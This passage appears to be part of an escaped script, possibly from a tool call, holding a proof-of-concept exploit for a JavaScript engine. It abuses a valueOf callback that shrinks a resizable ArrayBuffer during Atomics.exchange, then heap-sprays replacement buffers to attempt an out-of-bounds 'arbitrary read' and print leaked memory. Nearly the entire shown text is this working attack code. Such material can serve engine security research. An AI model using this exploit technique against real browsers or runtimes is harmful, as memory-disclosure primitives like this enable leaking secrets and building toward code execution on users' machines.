    sprayArray[2] = 0x13371337;\n        sprayArray[3] = 0x8badf00d;\n        \n        // The sprayBuffer might be allocated in the same place as our original buffer\n        return 0x0; // Exchange with 0\n    }\n};\n\ntry {\n    print(\"Performing arbitrary read via Atomics.exchange...\");\n    let leakedValue = Atomics.exchange(int32Array, targetIndex, malicious);\n    print(\"Leaked value:\", leakedValue.toString(16));\n    \n    // Try again to see if we can get consistent results\n    let ab2 = new ArrayBuffer(1024, { maxByteLength: 2048 });\n    let int32Array2 = new Int32Array(ab2);\n    int32Array2[targetIndex] = 0xabcdef01;\n    \n    let malicious2 = {\n        valueOf: function() {\n            ab2.resize(8);\n            let sprayBuffer2 = new ArrayBuffer(1024);\n            let sprayArray2 = new Int32Array(sprayBuffer2);\n            sprayArray2[200] = 0x12345678; // Put something at the exact offset we're reading\n            return 0x0;\n        }\n    };\n    \n    let leakedValue2 = Atomics.exchange(int32Array2, targetIndex, malicious2);\n    print(\"Second leaked value:\", leakedValue2.toString(16));\n    \n} catch (e) {\n    print(\"Arbitrary read failed:\", e);\n}\n\nprint(\"Done\");"})
